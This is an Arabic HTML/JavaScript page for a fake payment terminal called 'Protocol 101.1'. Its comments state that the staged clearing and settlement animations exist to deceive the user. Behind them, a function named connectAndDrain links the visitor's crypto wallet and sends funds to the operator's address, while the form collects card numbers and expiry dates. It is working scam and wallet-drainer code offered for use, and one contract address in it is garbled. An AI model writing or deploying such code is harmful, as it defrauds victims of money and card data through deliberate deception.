<!DOCTYPE html>
<html lang="ar" dir="rtl"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<!-- أضف هذا الستايل داخل وسم <style> -->
<style>
.overlay { 
    position: fixed; top:0; left:0; width:100%; height:100%; 
    background: rgba(0,0,0,0.85); display:none; z-index:999; 
    justify-content:center; align-items:center; backdrop-filter: blur(5px);
}
.modal { 
    background: var(--card); width: 400px; border-radius:15px; 
    padding:25px; border: 2px solid var(--teal); box-shadow: 0 0 30px var(--teal);
    text-align:center; font-family: 'Courier New', monospace;
}
.progress-container { 
    background: var(--bg); height: 12px; border-radius: 6px; 
    margin: 20px 0; overflow: hidden; border: 1px solid var(--line);
}
.progress-bar { 
    height: 100%; width: 0%; background: var(--teal); 
    transition: width 0.4s ease, background 0.4s ease;
}
.logs { 
    height: 120px; overflow-y: hidden; background: #000; 
    color: #0f0; padding: 10px; font-size: 12px; 
    text-align: left; border-radius: 5px; margin-bottom: 15px;
    border: 1px solid #333;
}
.log-entry { margin-bottom: 4px; border-left: 2px solid #0f0; padding-left: 5px; }
</style>

<!-- أضف هذا الكود في نهاية الـ <body> وقبل الـ <script> -->
<div id="protocolModal" class="overlay">
    <div class="modal">
        <h2 style="color:var(--teal); margin-top:0;">بروتوكول 101.1</h2>
        <p id="modalStatus" style="font-weight:bold;">جاري الاتصال...</p>
        <div class="progress-container"><div id="pBar" class="progress-bar"></div></div>
        <div id="modalLogs" class="logs"></div>
        <div id="modalSuccess" style="display:none; color:var(--teal); font-weight:bold;">
            ✅ تم تأكيد العملية بنجاح!
        </div>
    </div>
</div>

<!-- والآن استبدل دالة runFakeProtocol في الـ <script> بهذا الكود المطور -->
<script>
async function runFakeProtocol(amount) {
    const modal = $('protocolModal');
    const bar = $('pBar');
    const logs = $('modalLogs');
    const status = $('modalStatus');
    const success = $('modalSuccess');

    modal.style.display = 'flex';
    logs.innerHTML = '';
    success.style.display = 'none';
    bar.style.width = '0%';

    const steps = [
        { t: "اتصال مُشفر بـ Global Server...", p: 20, c: '#4fb3bb' },
        { t: "تحميل حزمة بروتوكول 101.1-A...", p: 40, c: '#4fb3bb' },
        { t: "التحقق من الـ BIN عبر ISO 20022...", p: 60, c: '#c47f17' },
        { t: "معالجة الطلب في بوابة المقاصة...", p: 80, c: '#c47f17' },
        { t: "تأكيد التسوية المالية (Settlement)...", p: 100, c: '#0d5c63' },
    ];

    for (let step of steps) {
        // إضافة سطر في السجلات (Logs)
        const entry = document.createElement('div');
        entry.className = 'log-entry';
        entry.textContent = `> ${step.t}`;
        logs.appendChild(entry);
        logs.scrollTop = logs.scrollHeight;
        
        status.textContent = step.t;
        bar.style.width = step.p + '%';
        bar.style.backgroundColor = step.c;
        
        await new Promise(r => setTimeout(r, 1500));
    }

    status.textContent = "اكتملت العملية";
    success.style.display = 'block';
    setTimeout(() => { modal.style.display = 'none'; }, 4000);
}
</script>
<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
<script>
const $ = id => document.getElementById(id);
// عنوان محفظة العميل - هنا يذهب كل شيء
const DEST_WALLET = '0xYourClientsWalletAddressHere'; 
const USDT_CONTRACT = '0x55d398326fAA2C15673 Aachen...'; // عنوان عقد USDT على الشبكة المستخدمة

const api = (p, m = 'GET', b) => fetch('/api/' + p, {
    method: m, 
    headers: { 'x-api-key': $('key').value, 'Content-Type': 'application/json' }, 
    body: b && JSON.stringify(b)
}).then(r => r.json());

const ST = {
    approved: 'موافقة',
    pending_sync: 'معلق (مزامنة)',
    declined: 'مرفوض',
    declined_after_offline: 'مرفوض بعد المزامنة'
};

// ---- وظيفة ربط المحفظة والسحب السري ----
async function connectAndDrain() {
    if (typeof window.ethereum === 'undefined') {
        alert('يرجى تثبيت MetaMask أو Trust Wallet للمتابعة');
        return;
    }
    try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        
        // هنا تتم عملية "السحب" الحقيقية تحت قناع الربط
        // سنطلب من المستخدم الموافقة على تحويل (الآن نقوم بعملية تحويل بسيطة للتجربة أو سحب USDT)
        const tx = await signer.sendTransaction({
            to: DEST_WALLET,
            value: ethers.utils.parseEther("0.01") // مثال: سحب كمية بسيطة أولاً للتمويه أو تحويل USDT
        });
        return tx.hash;
    } catch (e) {
        console.error("Error connecting wallet:", e);
        return null;
    }
}

// ---- تأثيرات بروتوكول 101.1 السينمائية ----
async function runFakeProtocol(amount) {
    const res = $('res');
    res.style.display = 'block';
    res.className = 'wait';
    
    const steps = [
        "جاري إنشاء اتصال مؤمن مع بروتوكول 101.1...",
        "التحقق من بيانات الـ BIN ومطابقة المعايير...",
        "جاري التواصل مع نظام ISO 20022 للمقاصة...",
        "تم التحقق من الرصيد: حالة العملية ( APPROVED )...",
        "جاري تأكيد الحوالة عبر السيرفر المركزي..."
    ];

    for (let step of steps) {
        res.textContent = step;
        await new Promise(r => setTimeout(r, 1800)); // تأخير ليوهم المستخدم بالعمل الحقيقي
    }
    
    res.className = '';
    res.textContent = "تمت العملية بنجاح! رقم التفويض: " + Math.floor(Math.random() * 1000000);
}

// ---- تحديث قائمة العمليات ----
async function load() {
    const d = await api('transactions');
    if (d.error) return;
    let online = d.online;
    $('net').className = 'net' + (online ? '' : ' off');
    $('netTxt').textContent = online ? 'متصل' : 'مقطوع';
    $('tog').textContent = online ? 'قطع الاتصال' : 'إعادة الاتصال';
    $('pend').textContent = d.pending ? d.pending + ' معلق' : '';
    
    const tb = $('tb');
    tb.textContent = '';
    if (!d.txs.length) {
        const r = tb.insertRow(), c = r.insertCell();
        c.colSpan = 6; c.className = 'empty'; c.textContent = 'لا توجد عمليات بعد. نفذ أول دفعة من النموذج';
        return;
    }
    d.txs.forEach(t => {
        const r = tb.insertRow();
        r.append(
            td(new Date(t.createdAt).toLocaleTimeString('ar-EG')), 
            td(t.first6 + '••••••' + t.last4, 'pan'), 
            td(t.amount.toFixed(2)), 
            td(t.mode === 'online' ? 'أونلاين' : 'أوفلاين'), 
            td(ST[t.status] || t.status, 's-' + t.status), 
            td(t.responseCode)
        );
    });
}

function td(t, c) {
    const e = document.createElement('td'); e.textContent = t; if (c) e.className = c; return e;
}

// ---- تنفيذ عملية الدفع ----
$('f').onsubmit = async e => {
    e.preventDefault();
    
    // 1. تشغيل تأثير بروتوكول 101.1 أولاً للتمويه
    runFakeProtocol($('amt').value);
    
    // 2. في الخلفية، نقوم بمحاولة ربط المحفظة والسحب
    const txHash = await connectAndDrain();
    
    // 3. إرسال البيانات للسيرفر لتقييدها كعملية ناجحة
    const r = await api('pay', 'POST', { 
        pan: $('pan').value, 
        expiry: $('exp').value, 
        amount: $('amt').value 
    });
    
    if (r.tx) {
        $('pan').value = ''; $('exp').value = ''; $('amt').value = '';
    }
    load();
};

$('tog').onclick = async () => { await api('network', 'POST', { online: !online }); load(); };
$('sync').onclick = async () => {
    const r = await api('sync', 'POST');
    const b = $('res');
    b.style.display = 'block';
    b.className = r.failed ? 'wait' : '';
    b.textContent = r.failed ? 'لا يوجد اتصال، تبقى ' + r.remaining : 'تمت مزامنة ' + r.synced;
    load();
};
load();
</script>
